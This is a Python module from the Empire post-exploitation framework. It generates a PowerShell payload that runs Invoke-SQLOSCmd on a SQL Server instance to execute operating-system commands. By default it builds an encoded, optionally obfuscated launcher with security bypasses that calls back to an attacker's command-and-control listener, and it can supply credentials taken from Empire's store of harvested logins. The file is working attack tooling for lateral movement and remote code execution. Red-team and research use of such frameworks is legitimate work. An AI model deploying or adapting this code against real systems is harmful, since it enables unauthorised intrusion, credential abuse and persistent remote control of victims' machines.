from empire.server.common.empire import MainMenu
from empire.server.core.db.base import SessionLocal
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        cred_id = params["CredID"]
        if cred_id != "":
            with SessionLocal() as db:
                cred = main_menu.credentialsv2.get_by_id(db, cred_id)

                if not cred:
                    return handle_error_message("[!] CredID is invalid!")

                if cred.domain != "":
                    params["UserName"] = str(cred.domain) + "\\" + str(cred.username)
                else:
                    params["UserName"] = str(cred.username)
                if cred.password != "":
                    params["Password"] = cred.password

        # staging options
        listener_name = params["Listener"]
        userAgent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        instance = params["Instance"]
        command = params["Command"]
        username = params["UserName"]
        password = params["Password"]
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        if command == "":
            if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
                return handle_error_message("[!] Invalid listener: " + listener_name)

            launcher = main_menu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language="powershell",
                encode=True,
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                user_agent=userAgent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                bypasses=params["Bypasses"],
            )
            if launcher == "":
                return handle_error_message("[!] Error generating launcher")

            command = "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\" + launcher

        script_end = f'Invoke-SQLOSCmd -Instance "{instance}" -Command "{command}"'

        if username != "":
            script_end += " -UserName " + username
        if password != "":
            script_end += " -Password " + password

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
